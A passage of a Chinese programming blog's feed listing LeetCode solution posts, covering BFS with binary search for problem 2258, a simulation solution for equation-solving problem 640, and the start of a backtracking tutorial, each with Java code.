class="line"></span><br><span class="line">            <span class="comment">// 暴力在第52个案例超时，尝试用二分</span></span><br><span class="line">            <span class="comment">// int su = 0;</span></span><br><span class="line">            <span class="comment">// for (int j = 0; j &lt; n; j++) &#123;</span></span><br><span class="line">            <span class="comment">//     long check = (long)spells[i] * (long)potions[j];</span></span><br><span class="line">            <span class="comment">//     if (check &gt;= success) &#123;</span></span><br><span class="line">            <span class="comment">//         su  = su + (n - j);</span></span><br><span class="line">            <span class="comment">//         break;</span></span><br><span class="line">            <span class="comment">//     &#125;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="comment">// res[i] = su;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2258-逃离火灾（困难）"><a href="#2258-逃离火灾（困难）" class="headerlink" title="2258. 逃离火灾（困难）"></a>2258. 逃离火灾（困难）</h5><p>图+BFS+二分查找</p><blockquote><p>Problem: <a href="https://leetcode.cn/problems/escape-the-spreading-fire/description/">2258. 逃离火灾</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个下标从 <strong>0</strong>&nbsp;开始大小为 <code>m x n</code>&nbsp;的二维整数数组&nbsp;<code>grid</code>&nbsp;，它表示一个网格图。每个格子为下面 3 个值之一：</p><ul>    <li><code>0</code> 表示草地。</li>    <li><code>1</code> 表示着火的格子。</li>    <li><code>2</code>&nbsp;表示一座墙，你跟火都不能通过这个格子。</li></ul><p>一开始你在最左上角的格子&nbsp;<code>(0, 0)</code>&nbsp;，你想要到达最右下角的安全屋格子&nbsp;<code>(m - 1, n - 1)</code>&nbsp;。每一分钟，你可以移动到&nbsp;<strong>相邻</strong>&nbsp;的草地格子。每次你移动 <strong>之后</strong>&nbsp;，着火的格子会扩散到所有不是墙的 <strong>相邻</strong>&nbsp;格子。</p><p>请你返回你在初始位置可以停留的 <strong>最多 </strong>分钟数，且停留完这段时间后你还能安全到达安全屋。如果无法实现，请你返回 <code>-1</code>&nbsp;。如果不管你在初始位置停留多久，你 <strong>总是</strong>&nbsp;能到达安全屋，请你返回&nbsp;<code>10<sup>9</sup></code>&nbsp;。</p><p>注意，如果你到达安全屋后，火马上到了安全屋，这视为你能够安全到达安全屋。</p><p>如果两个格子有共同边，那么它们为 <strong>相邻</strong>&nbsp;格子。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://assets.leetcode.com/uploads/2022/03/10/ex1new.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2022/03/10/ex1new.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 650px; height: 404px;"></p><pre><b>输入：</b>grid = [[0,2,0,0,0,0,0],[0,0,0,2,2,1,0],[0,2,0,0,1,2,0],[0,0,2,2,2,0,2],[0,0,0,0,0,0,0]]<b>输出：</b>3<b>解释：</b>上图展示了你在初始位置停留 3 分钟后的情形。你仍然可以安全到达安全屋。停留超过 3 分钟会让你无法安全到达安全屋。</pre><p><strong>示例 2：</strong></p><p><img alt="" src="https://assets.leetcode.com/uploads/2022/03/10/ex2new2.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2022/03/10/ex2new2.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 515px; height: 150px;"></p><pre><b>输入：</b>grid = [[0,0,0,0],[0,1,2,0],[0,2,0,0]]<b>输出：</b>-1<b>解释：</b>上图展示了你马上开始朝安全屋移动的情形。火会蔓延到你可以移动的所有格子，所以无法安全到达安全屋。所以返回 -1 。</pre><p><strong>示例 3：</strong></p><p><img alt="" src="https://assets.leetcode.com/uploads/2022/03/10/ex3new.jpg" class="lazyload" data-srcset="https://assets.leetcode.com/uploads/2022/03/10/ex3new.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 174px; height: 150px;"></p><pre><b>输入：</b>grid = [[0,0,0],[2,2,0],[1,2,0]]<b>输出：</b>1000000000<b>解释：</b>上图展示了初始网格图。注意，由于火被墙围了起来，所以无论如何你都能安全到达安全屋。所以返回 10<sup>9</sup> 。</pre><p><strong>提示：</strong></p><ul>    <li><code>m == grid.length</code></li>    <li><code>n == grid[i].length</code></li>    <li><code>2 &lt;= m, n &lt;= 300</code></li>    <li><code>4 &lt;= m * n &lt;= 2 * 10<sup>4</sup></code></li>    <li><code>grid[i][j]</code>&nbsp;是&nbsp;<code>0</code>&nbsp;，<code>1</code>&nbsp;或者&nbsp;<code>2</code>&nbsp;。</li>    <li><code>grid[0][0] == grid[m - 1][n - 1] == 0</code></li></ul></div><ol><li><p>思路</p><blockquote><p>题目为找人可以延迟多少分钟后再逃，即找最大延迟时间，设最大延迟时间为 t，只要在不超过 t 时间内这个人都是可以逃得掉的，那么这道题可以转化为找 t 时间，可以用二分查找。</p></blockquote></li><li><p>解题方法</p><blockquote><p>t 时间的范围为 0 到 m * n - 1，先求火在 t 时间蔓延有没有遇到人，如果没有遇到再让人和火一起赛跑，如果蔓延到人了就 GG 然后继续循环，直到找到最大的 t 时间。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>添加时间复杂度： check 时间复杂度 $O(mn)$，二分时间复杂度 $O(logmn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>添加空间复杂度： $O(m * n)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 二分查找</span></span><br><span class="line">    <span class="type">int</span>[][] dirs = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="type">boolean</span> ok;</span><br><span class="line">    <span class="type">int</span>[][] g, fg, pg;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumMinutes</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        m = grid.length;</span><br><span class="line">        n = grid[<span class="number">0</span>].length;</span><br><span class="line">        g = grid;</span><br><span class="line">        fg = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        pg = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="comment">// 判断刚开始人是否能逃</span></span><br><span class="line">        <span class="keyword">if</span> (!check(<span class="number">0</span>)) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 开始做最右边界的二分查找</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = m * n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (check(mid)) &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r == m * n -<span class="number">1</span> ? (<span class="type">int</span>)<span class="number">1e9</span> : r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查第 t 秒人是否能逃</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> t)</span> &#123;</span><br><span class="line">        ok = <span class="literal">false</span>;</span><br><span class="line">        Queue&lt;<span class="type">int</span>[]&gt; fire = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 先找出原始火的位置，加入队列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j ++) &#123;</span><br><span class="line">                <span class="comment">// 每次检查 t 都要初始化人和火的位置</span></span><br><span class="line">                fg[i][j] = pg[i][j] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (g[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    fg[i][j] = <span class="number">1</span>;</span><br><span class="line">                    fire.offer(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, j&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// bfs t 秒后火蔓延的位置</span></span><br><span class="line">        <span class="keyword">while</span>(t-- &gt; <span class="number">0</span>) update(fire, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 如果火蔓延到人的位置，则当前t时间不可</span></span><br><span class="line">        <span class="keyword">if</span> (fg[<span class="number">0</span>][<span class="number">0</span>] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 开始人和火追逐</span></span><br><span class="line">        Queue&lt;<span class="type">int</span>[]&gt; people = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        pg[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        people.offer(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        <span class="keyword">while</span>(!people.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 火先走，到人</span></span><br><span class="line">            update(fire, <span class="literal">true</span>, <span class="number">1</span>);</span><br><span class="line">            update(people, <span class="literal">false</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (ok) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// bfs 函数，true 为 火， false 为 人，offset 为人和火开始走的标识</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Queue&lt;<span class="type">int</span>[]&gt; q, <span class="type">boolean</span> isFire, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sz</span> <span class="operator">=</span> q.size();</span><br><span class="line">        <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span>[] info = q.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> info[<span class="number">0</span>], y = info[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] dir: dirs) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nx</span> <span class="operator">=</span> x + dir[<span class="number">0</span>], ny = y + dir[<span class="number">1</span>];</span><br><span class="line">                <span class="comment">// 判断是否越界</span></span><br><span class="line">                <span class="keyword">if</span> (nx &lt; <span class="number">0</span> || nx &gt;= m || ny &lt; <span class="number">0</span> || ny &gt;= n) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">// 如果为墙</span></span><br><span class="line">                <span class="keyword">if</span> (g[nx][ny] == <span class="number">2</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">// 如果为火</span></span><br><span class="line">                <span class="keyword">if</span> (isFire) &#123;</span><br><span class="line">                    <span class="comment">// 如果不可蔓延</span></span><br><span class="line">                    <span class="keyword">if</span> (fg[nx][ny] != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    fg[nx][ny] = fg[x][y] + offset;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果为人</span></span><br><span class="line">                    <span class="comment">// 如果走到终点，并且终点没有火；或者火已经在了终点（因为check时火比人先走一步），并且人再走一步就到终点，则人可以安全到达</span></span><br><span class="line">                    <span class="keyword">if</span> (nx == m - <span class="number">1</span> &amp;&amp; ny == n - <span class="number">1</span> &amp;&amp; (fg[nx][ny] == <span class="number">0</span> || fg[nx][ny] == pg[x][y] + offset)) ok = <span class="literal">true</span>;</span><br><span class="line">                    <span class="comment">// 如果位置被烧了或者人已经走过，则跳过</span></span><br><span class="line">                    <span class="keyword">if</span> (fg[nx][ny] != <span class="number">0</span> || pg[nx][ny] != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                    pg[nx][ny] = pg[x][y] + offset; </span><br><span class="line">                &#125;</span><br><span class="line">                q.offer(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;nx, ny&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 二分查找 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模拟题，根据题目规则嵌套if找答案</title>
      <link href="/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/"/>
      <url>/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>模拟，即题目给定规则，要求找到符合条件的解。</p><span id="more"></span><p>以算数计算题为例，求解模拟题的过程。</p><h5 id="640-求解方程"><a href="#640-求解方程" class="headerlink" title="640.求解方程"></a>640.求解方程</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/solve-the-equation/description/">640. 求解方程</a></p></blockquote><div class="px-5 pt-4"><div class="flex"></div><div class="xFUwe" data-track-load="description_content"><p>求解一个给定的方程，将<code>x</code>以字符串 <code>"x=#value"</code>&nbsp;的形式返回。该方程仅包含 <code>'+'</code> ， <code>'-'</code> 操作，变量&nbsp;<code>x</code>&nbsp;和其对应系数。</p><p>如果方程没有解或存在的解不为整数，请返回&nbsp;<code>"No solution"</code>&nbsp;。如果方程有无限解，则返回 <code>“Infinite solutions”</code> 。</p><p>题目保证，如果方程中只有一个解，则 <font color="#c7254e"><font face="Menlo, Monaco, Consolas, Courier New, monospace"><span style="font-size: 12.6px;"><span style="background-color: rgb(249, 242, 244);">'x'</span></span></font></font> 的值是一个整数。</p><p>&nbsp;</p><p><strong>示例 1：</strong></p><pre><strong>输入:</strong> equation = "x+5-3+x=6+x-2"<strong>输出:</strong> "x=2"</pre><p><strong>示例 2:</strong></p><pre><strong>输入:</strong> equation = "x=x"<strong>输出:</strong> "Infinite solutions"</pre><p><strong>示例 3:</strong></p><pre><strong>输入:</strong> equation = "2x=x"<strong>输出:</strong> "x=0"</pre><p>&nbsp;</p><p><strong>提示:</strong></p><ul>    <li><code>3 &lt;= equation.length &lt;= 1000</code></li>    <li><code>equation</code>&nbsp;只有一个&nbsp;<code>'='</code>.&nbsp;</li>    <li>方程由绝对值在&nbsp;<code>[0, 100]</code>&nbsp; 范围内且无任何前导零的整数和变量 <code>'x'</code>&nbsp;组成。<span style="display: block;"><span style="height: 0px;"><span style="position: absolute;">&ZeroWidthSpace;&ZeroWidthSpace;&ZeroWidthSpace;</span></span></span></li></ul></div></div><hr><ol><li><p>思路</p><blockquote><p>模拟题，分别对运算符进行判断，找出跟解相关的x和num的值，然后求解。</p></blockquote></li><li><p>解题方法</p><blockquote><p>‘+’和’-‘作为数值符号；’&#x3D;’作为等式左边计算完毕的判断，然后把’x’和’num’的符号取反然后继续运算；’x’如果没有数字要记作1；最后的答案对’x’的值和’num’的值判断即可。</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:<br>跟方程表达式的长度相关，$O(n)$</p></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$。如果用 .charAt() 可以降为$O(1)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">solveEquation</span><span class="params">(String equation)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟法 对 + - = 和 x 分别做判断</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> equation.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, num = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] s = equation.toCharArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">po</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; n) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s[index];</span><br><span class="line">            <span class="comment">// 记录改变数字的符号</span></span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">                index ++;</span><br><span class="line">                po = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                index ++;</span><br><span class="line">                po = -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 左边算完了，对调算右边</span></span><br><span class="line">                x = -x; num = -num; po = <span class="number">1</span>;</span><br><span class="line">                index++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 求数字</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> index;</span><br><span class="line">                <span class="keyword">while</span>(j &lt; n &amp;&amp; s[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; s[j] != <span class="string">&#x27;-&#x27;</span> &amp;&amp; s[j] != <span class="string">&#x27;=&#x27;</span>) j++;</span><br><span class="line">                <span class="comment">// 如果数字后一位为x</span></span><br><span class="line">                <span class="keyword">if</span>(s[j-<span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">                    x += ((j - <span class="number">1</span> == index) ? <span class="number">1</span> : Integer.parseInt(equation.substring(index, j - <span class="number">1</span>))) * po; </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 不为x，记录num的值</span></span><br><span class="line">                    num += Integer.parseInt(equation.substring(index, j)) * po;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 找完数字，继续查找下一个</span></span><br><span class="line">                index=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果没有x，只有数字，无解</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span> &amp;&amp; num != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No solution&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span> &amp;&amp; num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有x和数字，无穷解</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Infinite solutions&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;x=&quot;</span> + -<span class="number">1</span> * (num / x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 模拟 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>运用回溯算法，解决排列、组合和子集问题</title>
      <link href="/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/"/>
      <url>/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是<code>回溯算法</code>。</p><p>排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪&#x2F;加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。</p><span id="more"></span><p><strong>回溯算法框架</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line">def <span class="title function_">backtrack</span><span class="params">(路径, 选择列表)</span>:</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件:</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 选择 in 选择列表:</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>形式一、元素无重不可复选，即 nums 中的元素都是唯一的，每个元素最多只能被使用一次，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (used[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line"></span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>形式二、元素可重不可复选，即 nums 中的元素可以存在重复，每个元素最多只能被使用一次，其关键在于排序和剪枝，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span 